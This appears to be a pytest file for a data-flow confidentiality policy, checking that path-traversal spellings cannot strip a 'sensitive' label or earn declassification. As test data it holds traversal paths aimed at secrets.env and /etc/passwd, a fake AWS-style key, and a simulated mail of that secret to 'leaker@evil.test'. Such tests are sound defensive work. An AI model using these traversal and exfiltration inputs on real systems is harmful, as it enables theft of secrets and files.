"""Sensitivity and declassification are opposite polarities of one question.

They shared a matcher, and the traversal veto that is correct for a sink is
exactly backwards for a source. Matching a sink GRANTS permission, so `..` must
not match. Matching a sensitive pattern WITHHOLDS permission, so `..` must not
be able to shed the label.
"""
from __future__ import annotations

import pytest

from clayseal.capabilities.confidentiality import (
    FlowTracker,
    SensitivityPolicy,
    _lexical_normalize,
)

POLICY = SensitivityPolicy(
    sensitive=("/app/secrets.env", "db:sensitive"),
    declassified_sinks=("mail:board", "s3://bucket/*"),
)


@pytest.mark.parametrize("candidate", [
    "/app/secrets.env",
    "/app/data/../secrets.env",
    "/app/./secrets.env",
    "/app/a/b/../../secrets.env",
    "/app//secrets.env",
    "\\app\\data\\..\\secrets.env",
])
def test_a_traversal_cannot_shed_the_sensitive_label(candidate):
    """The live fail-open. `read /app/data/../secrets.env` was NOT sensitive, so
    the value was never observed and nothing downstream could refuse to send
    it: flow control was off for that read entirely."""
    assert POLICY.is_sensitive(candidate) is True, candidate


@pytest.mark.parametrize("candidate", ["/app/other.txt", "db:public", "", "x"])
def test_unrelated_targets_are_still_not_sensitive(candidate):
    """The fix must not label everything. A conservative matcher that matches
    everything is a deny-all wearing a label."""
    assert POLICY.is_sensitive(candidate) is False, candidate


def test_a_traversal_still_cannot_earn_declassification():
    """Opposite polarity, unchanged: matching a sink grants permission, so
    `s3://bucket/*` must not declassify `s3://bucket/../../etc/passwd`."""
    assert POLICY.is_declassified("s3://bucket/report.csv") == "s3://bucket/*"
    assert POLICY.is_declassified("s3://bucket/../../etc/passwd") is None


def test_argument_sinks_take_the_conservative_polarity():
    """Matching means 'this destination leaks its arguments', so a traversal
    must not shed that label either."""
    policy = SensitivityPolicy(argument_sinks=("/app/out.log",))
    assert policy.sends_its_arguments("t", None, "/app/x/../out.log") is True


def test_a_metacharacter_free_pattern_is_compared_exactly():
    literal = SensitivityPolicy(sensitive=("report1.txt",))
    assert literal.is_sensitive("report1.txt") is True
    assert literal.is_sensitive("reportX.txt") is False
    glob = SensitivityPolicy(sensitive=("/app/*.env",))
    assert glob.is_sensitive("/app/prod.env") is True


def test_a_bracket_in_a_literal_filename_is_still_treated_as_a_glob():
    """A pre-existing gap, asserted rather than asserted around.

    `_match_literal`'s docstring motivates itself with an operator writing the
    literal filename `report[1].txt` and accidentally covering `report1.txt`.
    The guard it added only applies to patterns with NO metacharacter, and
    `report[1].txt` has one, so that exact example still globs. Harmless in the
    sensitive direction (it matches more) and fail-open in the sink direction
    (it declassifies more than the operator wrote).

    Out of scope for the polarity fix; recorded so it is a known gap rather than
    a surprise, and so a future escape does not read as a regression.
    """
    policy = SensitivityPolicy(declassified_sinks=("report[1].txt",))
    assert policy.is_declassified("report1.txt") == "report[1].txt"
    assert policy.is_declassified("report[1].txt") is None


@pytest.mark.parametrize("raw,expected", [
    ("/app/data/../secrets.env", "/app/secrets.env"),
    ("/app/./x", "/app/x"),
    ("a/b/../c", "a/c"),
    ("../../x", "x"),          # clamps at root rather than failing
    ("/a//b", "/a/b"),
])
def test_lexical_normalize(raw, expected):
    assert _lexical_normalize(raw) == expected


def test_the_tracker_observes_a_traversal_named_secret():
    """End to end: the read must register, or the write that carries the value
    has nothing to be refused against."""
    secret = "AKIA0123456789ABCDEFQZ"
    tracker = FlowTracker()
    tracker.observe("read", "/app/data/../secrets.env", secret, policy=POLICY,
                    structured_fields={"value": secret})
    verdict = tracker.check(tool="send_mail", verb="send",
                            resource="mail:leaker@evil.test",
                            args={"body": secret}, policy=POLICY)
    assert not verdict.allowed, "the value walked out of a traversal-named source"
